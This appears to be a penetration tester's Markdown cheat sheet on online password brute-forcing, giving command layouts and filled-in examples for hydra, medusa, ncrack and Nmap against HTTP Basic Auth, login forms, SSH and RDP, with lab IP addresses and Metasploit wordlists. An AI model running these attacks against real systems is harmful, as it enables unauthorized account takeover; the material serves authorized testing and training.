# Online Password Cracking

## Table of Contents
* [HTTP/HTTPS](#httphttps)
   * [Default Passwords](#default-passwords)
   * [HTTP Basic Authentication](#http-basic-authentication)
   * [HTTP Form Authenticaton (POST)](#http-form-authenticaton-post)
* [SSH](#ssh)
   * [Notable SSH wordlists](#notable-ssh-wordlists)
* [RDP](#rdp)


## HTTP/HTTPS

### Default Passwords

#### Nmap script
```
http-default-accounts: Tests for access with default credentials used by a variety of web applications and devices.
```

#### Nikto
By default, Nikto identifies default credentials in some common HTTP/HTTPS services (ex. Apache Tomcat)


### HTTP Basic Authentication
Web applications using Basic Authentication send user credentials in a request header with the following format:
```
Authorization: Basic base64(username:password)
```

**Tip:** ncrack appears to be the fastest, although any of the below tools work fine

#### hydra

##### HTTP Command layout
```
hydra -l/-L [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] "http-get://[IP_ADDRESS]:[PORT][URL_PATH]"
```

##### HTTPS Command layout
```
hydra -l/-L [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] "https-get://[IP_ADDRESS]:[PORT][URL_PATH]"
```

##### Example command
```
hydra -L userpass.txt -P userpass.txt "http-get://192.168.205.172:8080/manager/html"
```

##### Other potentially-useful options
```
-C [FILE]: file with user:pass combinations to try, instead of specifying separately
-M [FILE]: file containing multiple targets to attack
-S: connect using SSL/TLS
-O: connect using old SSLv3 and SSLv2
-U [module]: print additional options for specific module
-f: stop testing against current host when working credentials are found on current host
-F: stop testing against all hosts when working credentials are found on any host
```

##### Proxying hydra examples
Set HYDRA_PROXY_HTTP environment variable (for HTTP proxy):
```
export HYDRA_PROXY_HTTP=http://login:pass@proxy_host:proxy_port
```
Set HYDRA_PROXY environment variable (for all proxies):
```
export HYDRA_PROXY=socks5://login:pass@proxy_host:proxy_port
```

#### medusa

##### HTTP Command layout
```
medusa -h/-H [HOST]/[HOSTS_FILE] -u/-U [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] -n [PORT] -M http -m DIR:[URL_PATH]
```

##### HTTPS Command layout
```
medusa -h/-H [HOST]/[HOSTS_FILE] -u/-U [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] -n [PORT] -s -M http -m DIR:[URL_PATH]
```

##### Example command
```
medusa -h 192.168.32.245 -U userpass.txt -P userpass.txt -n 8080 -M http -m DIR:/manager/html
```

##### Other potentially-useful options
```
-C [FILE]: file with user:pass or host:user:pass combinations to try, instead of specifying separately
-t [NUM]: number of logins to be tested concurrently
-T [NUM]: number of hosts to be tested concurrently
-f: stop testing against current host when working credentials are found on current host
-F: stop testing against all hosts when working credentials are found on any host
-b: do not display startup banner
-v [NUM]: set verbosity level to [NUM]. Default medusa output is very verbose (every login attempt is printed), so this can be used for cleaner screenshots
"-v 4" will only print successful attempts
```

#### ncrack

##### HTTP (single host) Command layout
```
ncrack --user/-U [USERNAME]/[USERNAME_FILE] --pass/-P [PASSWORD]/[PASSWORD_FILE] http://[IP_ADDRESS]:[PORT] -m http:path=[URL_PATH]
```
[USERNAME] and [PASSWORD] can also be comma-separated lists

##### HTTPS (single host) Command layout
```
ncrack --user/-U [USERNAME]/[USERNAME_FILE] --pass/-P [PASSWORD]/[PASSWORD_FILE] https://[IP_ADDRESS]:[PORT] -m https:path=[URL_PATH]
```
[USERNAME] and [PASSWORD] can also be comma-separated lists

##### Example command
```
ncrack -U userpass.txt -P userpass.txt https://192.168.57.2:8443 -m http:path=/manager/html
```

##### Other potentially-useful options
```
-f: Stop all testing when working credentials are found on any host
-v: verbose output
-vv: very verbose output
```


### HTTP Form Authenticaton (POST)
Web applications using login forms send user credentials using body parameters in a POST request (using the content-type "application/x-www-form-urlencoded")

**Tip:** Intercept a login request in Burp Suite in order to identify the target URL, POST data, and any other information.

#### hydra

##### HTTP command layout
```
hydra -l/-L [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] "http-post-form://[IP_ADDRESS]:[PORT][TARGET_URL_PATH]:[POST_DATA]:[FAILED_LOGIN_STRING]"
```
* [POST_DATA]: Request body contents, fill in insertion points for usernames with ^USER^ and passwords with ^PASS^.
* [FAILED_LOGIN_STRING]: String encountered in responses when login fails

##### HTTPS command layout
```
hydra -l/-L [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] "https-post-form://[IP_ADDRESS]:[PORT][TARGET_URL_PATH]:[POST_DATA]:[FAILED_LOGIN_STRING]"
```
* [POST_DATA]: Request body contents, fill in insertion points for usernames with ^USER^ and passwords with ^PASS^.
* [FAILED_LOGIN_STRING]: String encountered in responses when login fails

##### Example Command
```
hydra -L /usr/share/wordlists/metasploit/mirai_user.txt -P /usr/share/wordlists/metasploit/mirai_user.txt "http-post-form://192.168.88.20:8887/login:username=^USER^&password=^PASS^&LocalAuth=No&LocalAuthWithDomain=No&loginButton=Login:Username or Password is incorrect"
```

##### Other potentially-useful options
```
-C [FILE]: file with user:pass combinations to try, instead of specifying separately
-M [FILE]: file containing multiple targets to attack
-S: connect using SSL/TLS
-O: connect using old SSLv3 and SSLv2
-U [module]: print additional options for specific module
-f: stop testing against current host when working credentials are found on current host
-F: stop testing against all hosts when working credentials are found on any host
```

##### Proxying hydra examples
Set HYDRA_PROXY_HTTP environment variable (for HTTP proxy):
```
export HYDRA_PROXY_HTTP=http://login:pass@proxy_host:proxy_port
```
Set HYDRA_PROXY environment variable (for all proxies):
```
export HYDRA_PROXY=socks5://login:pass@proxy_host:proxy_port
```

#### Burp Suite Intruder
Intruder in Burp Suite Free Version is VERY slow, so this method should be avoided in favor of faster methods.


## SSH

### Notable SSH wordlists
* piata_ssh_userpass.txt (Provided by the Metasploit Framework: /usr/share/wordlists/metasploit/piata_ssh_userpass.txt)

### medusa

#### Command layout
```
medusa -h/-H [HOST]/[HOSTS_FILE] -u/-U [USERNAME]/[USERNAME_FILE] -p/-P [PASSWORD]/[PASSWORD_FILE] -M ssh
```

#### Other potentially-useful options
```
-C [FILE]: file with user:pass or host:user:pass combinations to try, instead of specifying separately (any of the three options can be blank per line)
-t [NUM]: number of logins to be tested concurrently
-T [NUM]: number of hosts to be tested concurrently
-f: stop testing against current host when working credentials are found on current host
-F: stop testing against all hosts when working credentials are found on any host
-b: do not display startup banner
-v [NUM]: set verbosity level to [NUM]; Default medusa output is very verbose (every login attempt is printed), so this can be used for cleaner screenshots
"-v 4" will only print successful attempts
```

### ncrack

#### Command layout
```
ncrack --user/-U [USERNAME]/[USERNAME_FILE] --pass/-P [PASSWORD]/[PASSWORD_FILE] ssh://[HOST]:[PORT]
```

### Nmap

#### Command layout
```
nmap -p22 -sS -Pn --script ssh-brute --script-args "userdb=[USER_LIST_FILE],passdb=[PASSWORD_LIST_FILE]" [HOST]
```

#### Other useful options
```
brute.useraspass: try username as password for each username
```


## RDP
RDP password cracking is VERY SLOW, and should not be relied upon if there are other penetration options available.

### ncrack

#### Command layout
```
ncrack --user/-U [USERNAME]/[USERNAME_FILE] --pass/-P [PASSWORD]/[PASSWORD_FILE] rdp://[HOST],CL=1
```

